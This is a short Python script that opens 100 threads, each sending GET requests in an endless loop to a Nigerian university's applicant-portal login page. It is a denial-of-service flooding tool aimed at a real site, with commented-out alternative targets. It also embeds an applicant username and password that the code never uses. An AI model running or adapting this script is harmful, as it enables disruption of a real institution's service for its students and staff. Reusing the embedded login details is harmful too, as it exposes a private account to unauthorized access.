import requests
import threading

url = 'https://collegeportal.umyu.edu.ng/ug/applicant/index/index'
# url = 'https://umyu.edu.ng/'
# url = 'https://www.youtube.com/'

data = {
    'username': '07314756CG',
    'userpass': '1234567',
    'signin': 'Sign+in'
}

def do_req():
    while True:
        response = requests.get(url)
        print(response.text)


threads = []
for i in range(100):
    t = threading.Thread(target=do_req)
    t.daemon = True
    threads.append(t)

for i in range(100):
    threads[i].start()

for i in range(100):
    threads[i].join()